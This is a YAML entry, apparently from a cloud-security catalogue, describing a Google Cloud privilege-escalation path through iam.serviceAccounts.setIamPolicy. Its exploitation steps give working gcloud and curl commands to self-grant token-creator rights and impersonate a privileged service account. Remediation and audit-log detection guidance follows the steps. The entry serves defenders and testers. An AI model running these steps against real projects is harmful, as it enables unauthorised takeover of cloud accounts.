id: gcp-iam-002
name: iam.serviceAccounts.setIamPolicy
category: principal-access
services:
  - iam
permissions:
  required:
    - permission: iam.serviceAccounts.setIamPolicy
      resourceConstraints: Must be granted on the target service account, either via a custom role scoped to this permission or the predefined `roles/iam.serviceAccountAdmin` role
  additional:
    - permission: iam.serviceAccounts.getIamPolicy
      resourceConstraints: "Required only by `gcloud iam service-accounts add-iam-policy-binding`, which reads the target service account's existing IAM policy before merging and writing it back; not needed via the raw `setIamPolicy` REST API, which accepts a full policy body constructed from scratch"
    - permission: iam.serviceAccounts.list
      resourceConstraints: Helpful for enumerating service accounts in the project to identify setIamPolicy targets
description: A principal holding `iam.serviceAccounts.setIamPolicy` on a service account can overwrite that account's IAM policy to add a `roles/iam.serviceAccountTokenCreator` binding for itself, then call `generateAccessToken` to mint a short-lived OAuth token that authenticates as the target. If the target service account holds a privileged project role such as `roles/editor`, the attacker inherits all of its permissions through chained impersonation -- without ever needing a long-lived key or executing code on a workload. Writing a service account's IAM policy is functionally equivalent to holding that account's credentials.
prerequisites:
  admin:
    - A target service account must exist that the attacker's principal holds `iam.serviceAccounts.setIamPolicy` on, whether via a custom role or the predefined `roles/iam.serviceAccountAdmin` role
    - The target service account must hold administrative permissions at the project level (e.g., `roles/owner`, `roles/editor`, or an equivalent custom role)
  lateral:
    - A target service account must exist that the attacker's principal holds `iam.serviceAccounts.setIamPolicy` on, whether via a custom role or the predefined `roles/iam.serviceAccountAdmin` role
exploitationSteps:
  gcloud:
    - step: 1
      command: |
        gcloud iam service-accounts list \
          --project=PROJECT_ID \
          --format='value(email)'
      description: Enumerate service accounts to identify potential setIamPolicy targets. This reconnaissance requires the additional `iam.serviceAccounts.list` permission.
    - step: 2
      command: |
        gcloud iam service-accounts add-iam-policy-binding \
          TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
          --member=serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com \
          --role=roles/iam.serviceAccountTokenCreator
      description: "Self-grant `roles/iam.serviceAccountTokenCreator` on the target service account by rewriting its IAM policy. `gcloud add-iam-policy-binding` performs a read-modify-write: it reads the existing policy first (`iam.serviceAccounts.getIamPolicy`), merges the new binding, and writes it back, so it requires the additional `iam.serviceAccounts.getIamPolicy` permission."
    - step: 3
      command: |
        gcloud auth print-access-token \
          --impersonate-service-account=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com
      description: Mint a short-lived OAuth access token for the target service account using the newly-granted `roles/iam.serviceAccountTokenCreator`
    - step: 4
      command: |
        gcloud PROJECT_RESOURCE_COMMAND \
          --project=PROJECT_ID \
          --impersonate-service-account=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com
      description: Run a Google Cloud command as the target service account to exercise whatever project or resource permissions it holds
  curl:
    - step: 1
      command: |
        curl -sS -X POST \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{
            "policy": {
              "bindings": [{
                "role": "roles/iam.serviceAccountTokenCreator",
                "members": ["serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com"]
              }]
            }
          }' \
          "https://iam.googleapis.com/v1/projects/PROJECT_ID/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com:setIamPolicy"
      description: "Self-grant `roles/iam.serviceAccountTokenCreator` on the target service account by POSTing a complete policy body to the `setIamPolicy` REST endpoint. Unlike `gcloud add-iam-policy-binding`, this does not require a prior `getIamPolicy` read -- the full policy is constructed from scratch, proving `iam.serviceAccounts.setIamPolicy` is the only required permission. Note that this replaces the entire policy, so any existing bindings not included will be removed."
    - step: 2
      command: |
        TARGET_TOKEN=$(curl -sS -X POST \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
          "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com:generateAccessToken" \
          | jq -r '.accessToken')
      description: Mint a short-lived OAuth token for the target service account using the newly-granted `roles/iam.serviceAccountTokenCreator`, calling the IAM Credentials API directly
    - step: 3
      command: |
        curl -H "Authorization: Bearer $TARGET_TOKEN" \
          "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
      description: Use the minted token directly against Google APIs as the target service account
recommendation: |
  Writing a service account's IAM policy (`iam.serviceAccounts.setIamPolicy`) is functionally equivalent to holding that account's credentials -- any principal that can rewrite the policy can self-grant `roles/iam.serviceAccountTokenCreator` and then mint tokens at will. This makes `setIamPolicy` grants across a privilege boundary as dangerous as direct impersonation grants.

  - **Avoid granting `iam.serviceAccounts.setIamPolicy` across privilege boundaries** - Never grant policy-write rights on a service account to a principal that should not otherwise hold that account's permissions, whether via `roles/iam.serviceAccountAdmin` or a custom role scoped to just `setIamPolicy`.
  - **Scope policy-management grants with IAM Conditions** - Restrict `setIamPolicy` bindings with time-bound or attribute-based conditions rather than granting unconditional, standing access:

  ```json
  {
    "role": "roles/iam.serviceAccountAdmin",
    "members": ["serviceAccount:admin-sa@PROJECT_ID.iam.gserviceaccount.com"],
    "condition": {
      "title": "time-bound-sa-admin",
      "expression": "request.time < timestamp(\"2026-12-31T00:00:00Z\")"
    }
  }
  ```

  - **Apply least privilege to service accounts that can be impersonated** - Replace broad primitive roles like `roles/editor` or `roles/owner` with narrowly scoped predefined or custom roles that grant only what the workload needs.
  - **Resolve custom roles when detecting `setIamPolicy` grants** - The permission can arrive through `roles/iam.serviceAccountAdmin` or a narrowly scoped custom role; detection logic that only checks predefined role names will miss the custom-role variant.
  - Monitor Cloud Audit Logs for `iam.googleapis.com/SetIamPolicy` events on service accounts where the new policy adds `roles/iam.serviceAccountTokenCreator` (or a custom role including `iam.serviceAccounts.getAccessToken`) for a principal that previously could not impersonate the account.
  - Monitor for `iam.googleapis.com/GenerateAccessToken` events immediately following a `SetIamPolicy` that granted the caller tokenCreator on the same service account -- this self-grant-then-impersonate pattern is a high-confidence signal of privilege escalation.
  - Monitor for `iam.googleapis.com/SetIamPolicy` events that grant `iam.serviceAccounts.setIamPolicy` (via `roles/iam.serviceAccountAdmin` or a custom role) at the project level, which would cover every service account in the project.
  - Regularly audit IAM bindings with Policy Analyzer / IAM Recommender to identify service accounts whose policies can be written by lower-privilege principals.
limitations: |
  This path provides administrative access only if the target service account holds `roles/owner`, `roles/editor`, or an equivalent administrative custom role at the project level. If the target only has narrowly scoped permissions, the attacker inherits only those, though even limited additional access may enable further multi-hop escalation. Note that `roles/editor` and `roles/viewer` deliberately exclude Secret Manager payload access (`secretmanager.versions.access`), so reaching secrets specifically requires the target to also hold an explicit `roles/secretmanager.secretAccessor` grant.

  The `setIamPolicy` call replaces the entire IAM policy on the service account, not just appending a binding. The `gcloud add-iam-policy-binding` read-modify-write approach preserves existing bindings, while a raw `setIamPolicy` call that constructs the policy from scratch may remove them. In practice, the attacker only needs their own tokenCreator binding to succeed, so replacing the entire policy is viable.
